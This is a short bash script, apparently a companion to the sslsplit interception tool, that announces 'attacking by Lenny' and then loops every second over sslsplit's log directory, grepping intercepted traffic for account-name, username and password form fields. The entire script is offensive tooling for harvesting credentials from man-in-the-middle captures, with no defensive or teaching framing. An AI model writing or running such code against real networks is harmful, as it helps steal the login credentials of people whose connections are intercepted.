#! /bin/bash

cd sslsplit/logdir
echo 'attacking by Lenny....'
sleep 3
clear

while ((1))
do
    clear
    grep -R -e ".*acct_name=.*&password=.*"
    grep -R -e ".*&user=.*&password=.*"
    sleep 1
done
